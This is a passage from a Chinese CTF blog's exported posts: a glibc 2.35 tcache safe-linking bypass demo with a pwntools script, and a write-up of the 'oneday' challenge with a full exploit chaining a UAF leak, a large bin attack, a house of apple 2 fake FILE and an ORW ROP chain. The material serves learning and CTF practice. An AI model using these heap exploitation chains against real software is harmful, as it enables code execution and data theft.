%p\n&quot;</span>, &amp;num);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>,(<span class="type">void</span> *)b,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *c=<span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//  申请回来原本的 b chunk</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *d=<span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>,(<span class="type">void</span> *)d,<span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -o ez 1.c</span></span><br></pre></td></tr></table></figure><p>使用的是 2.35-0ubuntu3.8版本的libc,</p><p>程序首先申请两个相同大小的堆块，然后输出num,和chunk b的地址，然后free掉a和b,</p><p><img src="/2024/11/20/tcache%20bin%20%E7%9A%84key%E5%8A%A0%E5%AF%86%E6%9C%BA%E5%88%B6/image-20241126214019180.png" alt="image-20241126214019180"></p><p>可以看到0x555555559310里面是经过异或和移位的next指针，是通过</p><p>(0x555555559310&gt;&gt;12)^(0x5555555592a0)</p><p>然后给一次向chunk b中读入数据的机会，读入已经经过加密后的num指针，</p><p><img src="/2024/11/20/tcache%20bin%20%E7%9A%84key%E5%8A%A0%E5%AF%86%E6%9C%BA%E5%88%B6/image-20241126215551882.png" alt="image-20241126215551882"></p><p>成功把num放入tcache bin,然后把num申请出来，然后通过往dchunk中写值的方式，改变num中的值</p><p><img src="/2024/11/20/tcache%20bin%20%E7%9A%84key%E5%8A%A0%E5%AF%86%E6%9C%BA%E5%88%B6/image-20241126215800376.png" alt="image-20241126215800376"></p><p>达成了在tcache key的影响下，任意地址写。</p><p>攻击脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p,e,libc=load(<span class="string">&quot;./ez&quot;</span>)</span><br><span class="line"></span><br><span class="line">debug(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">chunk_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&quot;chunk_addr&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">edit_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&quot;edit_addr&quot;</span>)</span><br><span class="line"> </span><br><span class="line">key=chunk_addr&gt;&gt;<span class="number">12</span></span><br><span class="line"></span><br><span class="line">num=key^(edit_addr)</span><br><span class="line"></span><br><span class="line">log_addr(<span class="string">&quot;num&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(p64(num)+p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;already edit the num&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tcache bin attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>oneday</title>
      <link href="/2024/10/27/oneday/"/>
      <url>/2024/10/27/oneday/</url>
      
        <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>最近看了house of apple 2 的相关知识，</p><p>看到了roderick师傅在其博客中提到的例题oneday</p><p>拿来做了一下，</p><p>写下了这篇wp.</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><img src="/2024/10/27/oneday/image-20241027195747379.png" alt="image-20241027195747379"></p><p>checksec查看保护策略，保护全开</p><p><img src="/2024/10/27/oneday/image-20241108133653756.png" alt="image-20241108133653756"></p><p>禁用了execve</p><p>查看ida </p><p><img src="/2024/10/27/oneday/image-20241027195856987.png" alt="image-20241027195856987"></p><p><img src="/2024/10/27/oneday/image-20241027200302236.png" alt="image-20241027200302236"></p><p><img src="/2024/10/27/oneday/image-20241027200313704.png" alt="image-20241027200313704"></p><p><img src="/2024/10/27/oneday/image-20241027200348158.png" alt="image-20241027200348158"></p><p>分析程序发现，题目根据key的大小来决定可以申请堆块的大小，并且申请堆块只能申请key * 0x100,key * 0x100+0x10</p><p>key*2这3个固定大小的chunk</p><p><img src="/2024/10/27/oneday/image-20241027200455315.png" alt="image-20241027200455315"></p><p><img src="/2024/10/27/oneday/image-20241027200505974.png" alt="image-20241027200505974"></p><p>题目只给了一次edit的机会，同样也只给了一次show的机会。</p><h3 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h3><h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">add(1) #0</span><br><span class="line">add(3) #1</span><br><span class="line">add(2) #2</span><br><span class="line">add(3) #3</span><br><span class="line">add(3) #4</span><br><span class="line">add(3) #5</span><br><span class="line">add(3) #6</span><br><span class="line"></span><br><span class="line">free(3)#5</span><br><span class="line">free(5)#6</span><br><span class="line"></span><br><span class="line">show(3)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;\x3a\x20\x0a&quot;)</span><br><span class="line"></span><br><span class="line">addr=u64(p.recv(8))-0x21ace0</span><br><span class="line">log_addr(&quot;addr&quot;)</span><br><span class="line">heap=u64(p.recv(8))-0x0035f0-0x100-0x1000</span><br><span class="line">log_addr(&quot;heap&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>申请几个堆块，然后free掉3，5  让其依次进入unsorted bin 然后因为uaf的存在，此时进行show,就可以把chunk3中的libc和heap地址泄露出来。</p><h4 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">IO_list_all= addr+libc.sym[&#x27;_IO_list_all&#x27;]</span><br><span class="line">add(3) #7</span><br><span class="line">add(3) #8</span><br><span class="line">free(2)</span><br><span class="line">add(3)#9  #申请大chunk,让chunk2进入large bin</span><br><span class="line">free(0)   </span><br><span class="line">payload = p64(0)*3+p64(IO_list_all-0x20)</span><br><span class="line">edit(2,payload)</span><br><span class="line">add(3)#10  # 申请大chunk,让chunk 0  进入large bin</span><br><span class="line"></span><br><span class="line">add(1)#11 #触发unlink</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过large bin attack的方式把IO_list_all里面的内容替换为后放入large bin 的chunk 0地址</p><p><img src="/2024/10/27/oneday/image-20241108134821167.png" alt="image-20241108134821167"></p><p>这时我们已经用掉了唯一的一次edit机会，但是我们还要去伪造fake_io，不能去改写chunk0 的内容，在看了其他师傅的博客后发现，这时我们去再次申请一个和large bin 中较小chunk相同大小的chunk,就会触发unlink，会将大chunk的地址写入IO_list_all,使io_list_all里面的内容从chunk0的地址变为chunk2的地址。</p><p><img src="/2024/10/27/oneday/image-20241108135939876.png" alt="image-20241108135939876"></p><h4 id="magic-gadgets"><a href="#magic-gadgets" class="headerlink" title="magic_gadgets"></a>magic_gadgets</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x000000000016a06a: mov rbp, qword ptr [rdi + 0x48]; mov rax, qword ptr [rbp + 0x18]; lea r13, [rbp + 0x10]; mov dword ptr [rbp + 0x10], 0; mov rdi, r13; call qword ptr [rax + 0x28]; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是一条很有用的指令，rdi即为IO_file的首地址，所以我们可以控制rbp,rax, 同时有call qword ptr [rax + 0x28]; </p><p>可以控制程序的执行流。在这道题中，我选择通过把执行流控制为leave_ret同时控制rbp为提前布置好的orw地址去让程序执行提前布置好的orw链，orw读出flag,getshell.</p><h4 id="伪造结构体"><a href="#伪造结构体" class="headerlink" title="伪造结构体"></a>伪造结构体</h4><p>因为只有一次edit的机会所以我们连带fake_io和执行orw的rop链一起输入</p><h5 id="orw部分"><a href="#orw部分" class="headerlink" title="orw部分"></a>orw部分</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">orw=p64(pop_rdi)+p64(heap+0x1d28)+p64(pop_rsi)+p64(0)+p64(pop_rdx_r12)+p64(0)*2+p64(pop_rax)+p64(2)</span><br><span class="line">orw+=p64(syscall)  #open</span><br><span class="line">orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap+0x5000)+p64(pop_rdx_r12)+p64(0x20)*2+p64(pop_rax)+p64(0)+p64(syscall)    #read</span><br><span class="line">orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap+0x5000)+p64(pop_rdx_r12)+p64(0x20)*2+p64(pop_rax)+p64(1)+p64(syscall)    #write</span><br></pre></td></tr></table></figure><h5 id="fake-io部分"><a href="#fake-io部分" class="headerlink" title="fake_io部分"></a>fake_io部分</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">file_addr=heap+0x1c30</span><br><span class="line">IO_wide_data_addr=file_addr</span><br><span class="line">wide_vtable_addr = (file_addr+0xd8 + 8 + 8) - 0x68</span><br><span class="line">fake_io = b&quot;&quot;</span><br><span class="line">fake_io += p64(0)*3+p64(IO_list_all-0x20)</span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(0) </span><br><span class="line">fake_io += p64(file_addr+0x18+0xe8) </span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p32(2)</span><br><span class="line">fake_io += p32(0)</span><br><span class="line">fake_io += p64(0xFFFFFFFFFFFFFFFF)</span><br><span class="line">fake_io += p64(0x0a000000)</span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(0xFFFFFFFFFFFFFFFF)</span><br><span class="line">fake_io += p64(0)*2</span><br><span class="line">fake_io += p64(IO_wide_data_addr)</span><br><span class="line">fake_io += p64(0) * 2</span><br><span class="line">fake_io += p32(0xFFFFFFFF)</span><br><span class="line">fake_io = fake_io.ljust(0xD8 - 0x10, b&#x27;\x00&#x27;)</span><br><span class="line">fake_io += p64(libc.sym[&#x27;_IO_wfile_jumps&#x27;]+addr)</span><br><span class="line">fake_io += p64(wide_vtable_addr)</span><br><span class="line">fake_io += p64(magic_gadget)</span><br><span class="line">fake_io += p64(leave_ret)+p64(0x67616c662f2e)</span><br><span class="line">fake_io +=p64(file_addr+0xf0-0x28)</span><br><span class="line">fake_io+=p64(pop_rsi_r15)+p64(0)+p64(file_addr+0xf0-0x28)</span><br><span class="line">fake_io+=orw</span><br></pre></td></tr></table></figure><p>利用house of apple 2的模板去构建fake_io</p><h3 id="触发io"><a href="#触发io" class="headerlink" title="触发io"></a>触发io</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(&quot;enter your command: \n&quot;,str(6))</span><br></pre></td></tr></table></figure><p>最后我们选择通过选择一个不存在的选项去触发exit(0);</p><p>布置好的orw链</p><p><img src="/2024/10/27/oneday/image-20241108143047180.png" alt="image-20241108143047180"></p><p>最后执行完毕，getshell.</p><p><img src="/2024/10/27/oneday/image-20241108143118946.png" alt="image-20241108143118946"></p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp:"></a>完整exp:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">from tools import*</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">p=process(&quot;./oneday&quot;)</span><br><span class="line">e=ELF(&quot;./oneday&quot;)</span><br><span class="line">libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(choice):</span><br><span class="line">    p.sendlineafter(&quot;enter your command: \n&quot;,str(1))</span><br><span class="line">    p.sendlineafter(&quot;choise: &quot;,str(choice))</span><br><span class="line">    </span><br><span class="line">def free(index):</span><br><span class="line">    p.sendlineafter(&quot;enter your command: \n&quot;,str(2))</span><br><span class="line">    p.sendlineafter(&quot;Index: \n&quot;,str(index))</span><br><span class="line">    </span><br><span class="line">def edit(index,content):</span><br><span class="line">    p.sendlineafter(&quot;enter your command: \n&quot;,str(3))</span><br><span class="line">    p.sendlineafter(&quot;Index: &quot;,str(index))</span><br><span class="line">    p.sendafter(&quot;Message: &quot;,content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.sendlineafter(&quot;enter your command: \n&quot;,str(4))</span><br><span class="line">    p.sendlineafter(&quot;Index: &quot;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;&gt;&gt;\n&quot;,str(8))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(1)</span><br><span class="line">add(3)</span><br><span class="line">add(2)</span><br><span class="line">add(3)#3</span><br><span class="line">add(3)#4x</span><br><span class="line">add(3)#5x</span><br><span class="line">add(3)#6</span><br><span class="line"></span><br><span class="line">free(3)#5</span><br><span class="line">free(5)#6</span><br><span class="line"></span><br><span class="line">show(3)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;\x3a\x20\x0a&quot;)</span><br><span class="line"></span><br><span class="line">addr=u64(p.recv(8))-0x21ace0</span><br><span class="line">log_addr(&quot;addr&quot;)</span><br><span class="line">heap=u64(p.recv(8))-0x0035f0-0x100-0x1000</span><br><span class="line">log_addr(&quot;heap&quot;)</span><br><span class="line">IO_list_all= addr+libc.sym[&#x27;_IO_list_all&#x27;]</span><br><span class="line">add(3)#7y</span><br><span class="line">add(3)#8y</span><br><span class="line"></span><br><span class="line">pop_rsi_r15=0x000000000002a3e3+addr</span><br><span class="line">pop_rdi=0x000000000002a3e5+addr</span><br><span class="line">pop_rsi=0x000000000016333a+addr</span><br><span class="line">pop_rdx_r12=0x000000000011f2e7+addr</span><br><span class="line">pop_rax=0x0000000000045eb0+addr</span><br><span class="line">syscall=0x0000000000091316+addr</span><br><span class="line">leave_ret=0x000000000004da83+addr</span><br><span class="line">magic_gadget = addr + 0x000000000016a06a</span><br><span class="line">pop_rsp=0x000000000004181d+addr</span><br><span class="line">orw=p64(pop_rdi)+p64(heap+0x1d28)+p64(pop_rsi)+p64(0)+p64(pop_rdx_r12)+p64(0)*2+p64(pop_rax)+p64(2)</span><br><span class="line">orw+=p64(syscall)</span><br><span class="line">orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap+0x5000)+p64(pop_rdx_r12)+p64(0x20)*2+p64(pop_rax)+p64(0)</span><br><span class="line">orw+=p64(syscall)</span><br><span class="line">orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap+0x5000)+p64(pop_rdx_r12)+p64(0x20)*2+p64(pop_rax)+p64(1)</span><br><span class="line">orw+=p64(syscall)</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">add(3)#9</span><br><span class="line">free(0)</span><br><span class="line">file_addr=heap+0x1c30</span><br><span class="line">IO_wide_data_addr=file_addr</span><br><span class="line">wide_vtable_addr = (file_addr+0xd8 + 8 + 8) - 0x68</span><br><span class="line">fake_io = b&quot;&quot;</span><br><span class="line">fake_io += p64(0)*3+p64(IO_list_all-0x20)</span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(0) </span><br><span class="line"></span><br><span class="line">fake_io += p64(file_addr+0x18+0xe8) #</span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p32(2)</span><br><span class="line">fake_io += p32(0)</span><br><span class="line">fake_io += p64(0xFFFFFFFFFFFFFFFF)</span><br><span class="line">fake_io += p64(0x0a000000)</span><br><span class="line">fake_io += p64(0)</span><br><span class="line">fake_io += p64(0xFFFFFFFFFFFFFFFF)</span><br><span class="line">fake_io += p64(0)*2</span><br><span class="line">fake_io += p64(IO_wide_data_addr)</span><br><span class="line">fake_io += p64(0) * 2</span><br><span class="line">fake_io += p32(0xFFFFFFFF)</span><br><span class="line">fake_io = fake_io.ljust(0xD8 - 0x10, b&#x27;\x00&#x27;)</span><br><span class="line">fake_io += p64(libc.sym[&#x27;_IO_wfile_jumps&#x27;]+addr)</span><br><span class="line">fake_io += p64(wide_vtable_addr)</span><br><span class="line">fake_io += p64(magic_gadget)</span><br><span class="line">fake_io += p64(leave_ret)+p64(0x67616c662f2e)</span><br><span class="line">fake_io +=p64(file_addr+0xf0-0x28)</span><br><span class="line">fake_io+=p64(pop_rsi_r15)+p64(0)+p64(file_addr+0xf0-0x28)</span><br><span class="line">fake_io+=orw</span><br><span class="line"></span><br><span class="line">payload=fake_io.ljust(0x880,b&#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">edit(2,payload)</span><br><span class="line"></span><br><span class="line">add(3)#10</span><br><span class="line">add(1)#11</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug(p,addr+0x083b9b)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;enter your command: \n&quot;,str(6))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> house of apple2 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
